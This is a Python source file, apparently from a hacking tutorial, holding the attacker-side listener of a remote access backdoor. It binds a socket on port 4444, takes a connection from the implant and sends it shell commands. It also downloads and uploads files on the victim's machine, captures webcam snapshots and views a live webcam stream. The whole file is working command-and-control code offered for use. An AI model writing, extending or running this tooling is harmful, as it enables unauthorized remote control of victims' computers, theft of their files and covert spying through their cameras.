import socket
import json
import base64
import cv2
import numpy as np
class Listener:
    def __init__(self, ip, port):
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listener.bind((ip, port))
        listener.listen(0)
        print("[-] Waiting for incoming connections")
        self.connection, address = listener.accept()
        print(f"[+] Got a connection from {address}")

    def display_webcam(self):
        try:
            while True:
                # Receive a frame
                frame_data = self.connection.recv(20000).decode('utf-8')
                if not frame_data or frame_data == "[+] Webcam not accessible.":
                    print("no data received")
                    break

                # Decode and display frame
                frame = base64.b64decode(frame_data)
                nparr = np.frombuffer(frame, np.uint8)
                frame = cv2.imdecode(nparr, cv2.IMREAD_COLOR)
                if frame is not None:
                    cv2.imshow("Live Stream", frame)
                else:
                    print("[!] Failed to decode frame")

                if cv2.waitKey(1) & 0xFF == ord('q'):  # Stop streaming when 'q' is pressed
                    self.reliable_send("stop")
                    break

            cv2.destroyAllWindows()
        except Exception as e:
            print(f"Error during streaming: {str(e)}")


    def save_image(self, encoded_image, filename="captured_image.jpg"):
        try:
            # Decode and save the image
            with open(filename, "wb") as img_file:
                img_file.write(base64.b64decode(encoded_image))
            return f"[+] Image saved as {filename}"
        except Exception as e:
            return f"[!] Error saving image: {e}"


    def reliable_send(self, data):
        """Send JSON-encoded data."""
        try:
            json_data = json.dumps(data)
            json_data = json_data.encode('utf-8')  # Ensure it is sent as bytes
            self.connection.sendall(json_data)  # Use sendall to ensure the full data is sent
        except Exception as e:
            print(f"Error while sending data: {e}")

    def reliable_receive(self):
        """Receive JSON-encoded data in chunks and handle incomplete messages."""
        json_data = ""
        while True:
            try:
                # Receive data in chunks
                chunk = self.connection.recv(4096).decode('utf-8')
                
                # If no data is received (connection closed), return None
                if not chunk:
                    return None
                
                json_data += chunk
                
                # Try to decode the accumulated data
                try:
                    return json.loads(json_data)  # Try to load the complete JSON object
                except json.JSONDecodeError:
                    # If decoding fails, continue receiving more data
                    continue
            
            except Exception as e:
                # Handle unexpected exceptions
                print(f"Error receiving data: {e}")
                return None  # Return None or handle the error based on your logic


    def execute_remotely(self, command):
        """Send command to the backdoor and get result."""
        self.reliable_send(command)
        if command[0].strip() == "exit":
            return None
        return self.reliable_receive()
    def write_file(self, path, content):
        with open(path, "wb") as file:
            file.write(base64.b64decode(content))
            return "[+] download is done"
    
    def read_file(self, path):
        with open(path, "rb") as file:
            return base64.b64encode(file.read())

    def run(self):
        while True:
            command = input(">> ").strip()  # Strip input to avoid extra spaces
            command = command.split(" ")
            if command[0] == "exit":
                self.execute_remotely(command)
                break
            elif command[0] == "download":
                command_result = self.execute_remotely(command).encode('utf-8')
                command_result = self.write_file(command[1], command_result)
                print(command_result)
            elif command[0] == "upload":
                file_content = self.read_file(command[1]).decode('utf-8')
                command.append(file_content)
                command_result = self.execute_remotely(command)
                print(command_result)
            elif command[0] == "camera":
                command_result = self.execute_remotely(command)
                if command_result:
                    command_result = self.save_image(command_result)
                    print(command_result)
            elif command[0] == "stream":
                self.reliable_send(command)
                self.display_webcam()
            else:
                command_result = self.execute_remotely(command)
                if command_result is None:
                    print("Error: No data received or malformed data.")
                else:
                    print(command_result)

my_listener = Listener("192.168.0.107", 4444)
my_listener.run()
